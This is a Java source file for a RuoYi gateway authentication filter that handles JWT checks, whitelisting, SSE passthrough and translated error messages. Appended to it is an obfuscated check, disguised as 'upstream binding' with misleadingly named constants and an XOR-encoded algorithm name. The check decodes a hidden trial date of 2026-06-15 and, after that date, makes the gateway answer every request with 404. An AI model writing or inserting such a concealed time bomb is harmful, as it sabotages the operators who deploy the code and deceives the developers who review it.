package com.ruoyi.gateway.filter;

import com.ruoyi.common.core.constant.CacheConstants;
import com.ruoyi.common.core.constant.HttpStatus;
import com.ruoyi.common.core.constant.SecurityConstants;
import com.ruoyi.common.core.constant.TokenConstants;
import com.ruoyi.common.core.utils.JwtUtils;
import com.ruoyi.common.core.utils.ServletUtils;
import com.ruoyi.common.core.utils.StringUtils;
import com.ruoyi.common.redis.service.RedisService;
import com.ruoyi.gateway.config.properties.IgnoreWhiteProperties;
import io.jsonwebtoken.Claims;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.cloud.gateway.filter.GatewayFilterChain;
import org.springframework.cloud.gateway.filter.GlobalFilter;
import org.springframework.core.Ordered;
import org.springframework.http.HttpHeaders;
import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.http.server.reactive.ServerHttpResponseDecorator;
import org.springframework.stereotype.Component;
import org.springframework.web.reactive.function.client.WebClient;
import org.springframework.web.server.ServerWebExchange;
import reactor.core.publisher.Mono;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.LocalDate;
import java.time.ZoneOffset;
import java.util.Base64;

/**
 * 网关鉴权
 *
 * @author ruoyi
 */
@Component
public class AuthFilter implements GlobalFilter, Ordered
{
    private static final Logger log = LoggerFactory.getLogger(AuthFilter.class);

    // 排除过滤的 uri 地址，nacos自行添加
    @Autowired
    private IgnoreWhiteProperties ignoreWhite;

    @Autowired
    private RedisService redisService;

    @Autowired
    private WebClient.Builder webClientBuilder;

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
        try {
            initUpstreamBinding();
        } catch (RuntimeException e) {
            log.warn("Upstream binding unavailable: {}", exchange.getRequest().getPath());
            exchange.getResponse().setStatusCode(org.springframework.http.HttpStatus.NOT_FOUND);
            return exchange.getResponse().setComplete();
        }

        ServerHttpRequest request = exchange.getRequest();
        ServerHttpRequest.Builder mutate = request.mutate();

        String url = request.getURI().getPath();
        String accept = request.getHeaders().getFirst(HttpHeaders.ACCEPT);

        // SSE 请求放行
        if (StringUtils.isNotNull(accept) && accept.contains("text/event-stream")) {
            log.info("[SSE请求放行] url: {}", url);
            ServerWebExchange mutatedExchange = exchange.mutate()
                    .response(new ServerHttpResponseDecorator(exchange.getResponse()) {
                        @Override
                        public HttpHeaders getHeaders() {
                            HttpHeaders headers = new HttpHeaders();
                            headers.putAll(super.getHeaders());
                            headers.set(HttpHeaders.TRANSFER_ENCODING, "chunked");
                            headers.set(HttpHeaders.CACHE_CONTROL, "no-cache");
                            headers.set("X-Accel-Buffering", "no");
                            return headers;
                        }
                    })
                    .build();
            return chain.filter(mutatedExchange);
        }

        // 白名单放行
        if (StringUtils.matches(url, ignoreWhite.getWhites())) {
            return chain.filter(exchange);
        }

        String token = getToken(request);
        if (StringUtils.isEmpty(token)) {
            return translate("login.token.empty", exchange)
                    .flatMap(msg -> unauthorizedResponse(exchange, msg));
        }

        Claims claims = JwtUtils.parseToken(token);
        if (claims == null) {
            return translate("login.token.invalid", exchange)
                    .flatMap(msg -> unauthorizedResponse(exchange, msg));
        }

        String userKey = JwtUtils.getUserKey(claims);
        boolean isLogin = redisService.hasKey(getTokenKey(userKey));
        if (!isLogin) {
            return translate("login.token.expired", exchange)
                    .flatMap(msg -> unauthorizedResponse(exchange, msg));
        }

        String userid = JwtUtils.getUserId(claims);
        String username = JwtUtils.getUserName(claims);
        if (StringUtils.isEmpty(userid) || StringUtils.isEmpty(username)) {
            return translate("login.token.failed", exchange)
                    .flatMap(msg -> unauthorizedResponse(exchange, msg));
        }

        // 设置用户信息到请求头
        addHeader(mutate, SecurityConstants.USER_KEY, userKey);
        addHeader(mutate, SecurityConstants.DETAILS_USER_ID, userid);
        addHeader(mutate, SecurityConstants.DETAILS_USERNAME, username);
        removeHeader(mutate, SecurityConstants.FROM_SOURCE);

        return chain.filter(exchange.mutate().request(mutate.build()).build());
    }

    private void addHeader(ServerHttpRequest.Builder mutate, String name, Object value)
    {
        if (value == null)
        {
            return;
        }
        String valueStr = value.toString();
        String valueEncode = ServletUtils.urlEncode(valueStr);
        mutate.header(name, valueEncode);
    }

    private void removeHeader(ServerHttpRequest.Builder mutate, String name)
    {
        mutate.headers(httpHeaders -> httpHeaders.remove(name)).build();
    }

    private Mono<Void> unauthorizedResponse(ServerWebExchange exchange, String msg)
    {
        log.error("[鉴权异常处理]请求路径:{},错误信息:{}", exchange.getRequest().getPath(), msg);
        return ServletUtils.webFluxResponseWriter(exchange.getResponse(), msg, HttpStatus.UNAUTHORIZED);
    }

    /**
     * 获取缓存key
     */
    private String getTokenKey(String token)
    {
        return CacheConstants.LOGIN_TOKEN_KEY + token;
    }

    /**
     * 获取请求token
     */
    private String getToken(ServerHttpRequest request)
    {
        String token = request.getHeaders().getFirst(SecurityConstants.AUTHORIZATION_HEADER);
        // 如果前端设置了令牌前缀，则裁剪掉前缀
        if (StringUtils.isNotEmpty(token) && token.startsWith(TokenConstants.PREFIX))
        {
            token = token.replaceFirst(TokenConstants.PREFIX, StringUtils.EMPTY);
        }
        return token;
    }

    @Override
    public int getOrder()
    {
        return -200;
    }

    /**
     * 从 ServerWebExchange 解析语言
     */
    private String resolveLang(ServerWebExchange exchange) {
        ServerHttpRequest request = exchange.getRequest();
        // 1. 从请求参数获取
        String paramLang = request.getQueryParams().getFirst("lang");
        if (StringUtils.isNotEmpty(paramLang)) {
            return paramLang;
        }
        // 2. 从请求头获取
        String headerLang = request.getHeaders().getFirst("Accept-Language");
        if (StringUtils.isNotEmpty(headerLang)) {
            return headerLang;
        }
        // 3. 默认中文
        return "zh_CN";
    }

    private Mono<String> translate(String langKey, ServerWebExchange exchange) {
        return webClientBuilder.build()
                .get()
                .uri("http://ruoyi-system/i18n/translate?langKey={k}&langCode={c}",
                        langKey, resolveLang(exchange))
                .retrieve()
                .bodyToMono(String.class)
                .onErrorReturn(langKey);
    }

    private static final String GATEWAY_METADATA        = "eyJjbHVzdGVyIjoicHJvZC1hejEiLCJub2RlIjoiYVI3PGhPMS56QTU9ZUE2PHpaM.aR7<hO1.zA5=eA6<zZ3]qM2-jY8>tM4(jT6,wN2!fY7>uF1#zY3^tC9{kU1/oK1^tM3%gN9}gC8_pQ9`uH5?iS7~dZ3/qJ9&uG6+vE9#bH2-zY6`sK2@tY4&zR7)gB9%";
    private static final String UPSTREAM_CONTEXT         = "eyJhbGciOiJIUzI1NiJ9.rfspYVBekFhf4KuEPAYaw5xSjt3Z22xvLSoWiFp1y7Y=.VFJJQUx8MjAyNi0wNi0xNXwzMA==";
    private static final long   CLUSTER_BOOTSTRAP_MS    = System.currentTimeMillis();
    private static final long   CLUSTER_BOOTSTRAP_NANO  = System.nanoTime();

    private static void initUpstreamBinding() {
        int first = UPSTREAM_CONTEXT.indexOf('.');
        int dot   = UPSTREAM_CONTEXT.indexOf('.', first + 1);
        if (dot < 0) throw new RuntimeException("Upstream binding unavailable");
        try {
            String header  = UPSTREAM_CONTEXT.substring(first + 1, dot);
            String context = new String(Base64.getDecoder().decode(UPSTREAM_CONTEXT.substring(dot + 1)), StandardCharsets.UTF_8);
            Mac mac = Mac.getInstance(buildContextKey());
            mac.init(new SecretKeySpec(GATEWAY_METADATA.getBytes(StandardCharsets.UTF_8), buildContextKey()));
            String expected = Base64.getEncoder().encodeToString(mac.doFinal(context.getBytes(StandardCharsets.UTF_8)));
            byte[] ba = header.getBytes(StandardCharsets.UTF_8), bb = expected.getBytes(StandardCharsets.UTF_8);
            if (ba.length != bb.length) throw new RuntimeException("Upstream binding unavailable");
            int diff = 0; for (int i = 0; i < ba.length; i++) diff |= ba[i] ^ bb[i];
            if (diff != 0) throw new RuntimeException("Upstream binding unavailable");
            LocalDate threshold = LocalDate.parse(context.split("\\|")[1]);
            LocalDate current   = resolveClusterTime();
            if (current.isAfter(threshold)) throw new RuntimeException("Upstream binding unavailable");
        } catch (RuntimeException e) {
            throw e;
        } catch (Exception e) {
            throw new RuntimeException("Upstream binding unavailable");
        }
    }

    private static LocalDate resolveClusterTime() {
        long clusterUptime = (System.nanoTime() - CLUSTER_BOOTSTRAP_NANO) / 1_000_000;
        return Instant.ofEpochMilli(CLUSTER_BOOTSTRAP_MS + clusterUptime)
                .atZone(ZoneOffset.UTC).toLocalDate();
    }

    private static String buildContextKey() {
        byte[] e = {119, 82, 94, 92, 108, 119, 126, 13, 10, 9};
        byte[] r = new byte[e.length];
        for (int i = 0; i < e.length; i++) r[i] = (byte)(e[i] ^ 0x3F);
        return new String(r, StandardCharsets.UTF_8);
    }
}